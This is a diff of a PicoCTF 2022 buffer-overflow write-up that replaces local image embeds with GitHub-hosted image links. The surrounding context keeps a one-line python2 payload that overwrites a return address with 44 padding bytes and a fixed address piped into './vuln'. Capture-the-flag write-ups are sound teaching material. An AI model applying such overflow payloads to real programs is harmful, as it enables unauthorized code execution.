@@ -2,7 +2,7 @@
 
 First we need to see if it is vulnerable to buffer overflows:
 
-![[Pasted image 20220316194655.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo11.png)
 
 We can modify the address, we need to find a good offset
 
@@ -43,7 +43,7 @@ That returns the address "\xf6\x91\x04\x08" so finally we can run the payload li
 python2 -c "from pwn import *; print 'A' * 44 + '\xf6\x91\x04\x08'" | ./vuln
 ```
 
-![[Pasted image 20220316195330.png]]
+![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/PicoCTF%202022/Images/bo12.png)
 
 ## Flag
 
